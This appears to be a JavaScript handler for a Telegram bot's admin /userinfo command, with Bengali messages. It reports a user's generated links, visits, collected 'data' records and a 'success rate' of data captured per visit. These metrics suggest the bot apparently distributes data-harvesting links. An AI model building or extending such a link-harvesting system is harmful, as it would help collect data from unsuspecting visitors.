const adminCheck = require('../middlewares/adminCheck');
const User = require('../models/User');
const Link = require('../models/Link');
const Data = require('../models/Data');
const helpers = require('../utils/helpers');

module.exports = async (bot, msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = msg.text;
  const replyTo = msg.reply_to_message;
  
  try {
    const isAdmin = await adminCheck(userId);
    if (!isAdmin) {
      return bot.sendMessage(chatId, '⛔ আপনি অ্যাডমিন নন।');
    }
    
    // টার্গেট ইউজার আইডি বের করা
    let targetId = null;
    
    if (replyTo) {
      targetId = replyTo.from.id;
    } else {
      const parts = text.split(' ');
      if (parts.length < 2) {
        return bot.sendMessage(chatId,
          `🎯 /userinfo [user_id বা @username] অথবা কোনো মেসেজ রিপ্লাই করুন`
        );
      }
      
      const target = parts[1];
      if (target.startsWith('@')) {
        const user = await User.findOne({ username: target.substring(1) });
        targetId = user?.userId;
      } else {
        targetId = parseInt(target);
      }
    }
    
    if (!targetId) {
      return bot.sendMessage(chatId, '❌ ইউজার পাওয়া যায়নি।');
    }
    
    // ইউজার ইনফো
    const user = await User.findOne({ userId: targetId });
    if (!user) {
      return bot.sendMessage(chatId, '❌ ইউজার পাওয়া যায়নি।');
    }
    
    // লিংক স্ট্যাটিস্টিক্স
    const totalLinks = await Link.countDocuments({ userId: targetId });
    const totalVisits = await Link.aggregate([
      { $match: { userId: targetId } },
      { $group: { _id: null, total: { $sum: '$visits' } } }
    ]);
    const totalData = await Data.countDocuments({ 
      linkId: { $in: (await Link.find({ userId: targetId }).select('linkId')).map(l => l.linkId) } 
    });
    
    // টপ লিংক
    const topLinks = await Link.find({ userId: targetId })
      .sort({ visits: -1 })
      .limit(3);
    
    let topLinksList = '';
    topLinks.forEach(link => {
      topLinksList += `\n• ${link.type.toUpperCase()} (${link.linkId})\n` +
        `👁️ ${link.visits} ভিজিট | 📦 ${link.data} ডাটা\n`;
    });
    
    const message = `👤 𝐃𝐄𝐓𝐀𝐈𝐋𝐄𝐃 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍\n\n` +
      `📋 বেসিক ইনফো:\n` +
      `🆔 আইডি: ${user.userId}\n` +
      `📛 নাম: ${user.firstName} ${user.lastName}\n` +
      `👤 ইউজারনেম: ${user.username ? '@'+user.username : 'নেই'}\n` +
      `📅 জয়েন: ${helpers.formatTime(user.joinedAt)}\n` +
      `⏰ লাস্ট একটিভ: ${helpers.formatTime(user.lastActive)}\n\n` +
      `🔰 স্ট্যাটাস:\n` +
      `${user.approved ? '✅' : '❌'} অ্যাপ্রুভড: ${user.approved ? 'হ্যাঁ' : 'না'}\n` +
      `${user.banned ? '❌' : '✅'} ব্যানড: ${user.banned ? 'হ্যাঁ' : 'না'}\n` +
      `${user.isAdmin ? '👑' : '👤'} অ্যাডমিন: ${user.isAdmin ? 'হ্যাঁ' : 'না'}\n\n` +
      `📊 অ্যাক্টিভিটি স্ট্যাটস:\n` +
      `• মোট লিঙ্ক: ${totalLinks}\n` +
      `• মোট ভিজিট: ${totalVisits[0]?.total || 0}\n` +
      `• মোট ডাটা: ${totalData}\n` +
      `• সাকসেস রেট: ${totalVisits[0]?.total ? ((totalData/totalVisits[0]?.total)*100).toFixed(1) : 0}%\n\n` +
      `🔥 টপ লিংকস:${topLinksList}\n\n` +
      `⚡ কুইক অ্যাকশন:\n` +
      `/ban ${user.userId} [কারণ]\n` +
      `/unban ${user.userId}\n` +
      `${user.approved ? '/reject' : '/approve'} ${user.userId}\n` +
      `${user.isAdmin ? '/removeadmin' : '/makeadmin'} ${user.userId}`;
    
    await bot.sendMessage(chatId, message);
    
  } catch (error) {
    console.error('UserInfo Command Error:', error);
    await bot.sendMessage(chatId, '❌ এরর হয়েছে।');
  }
};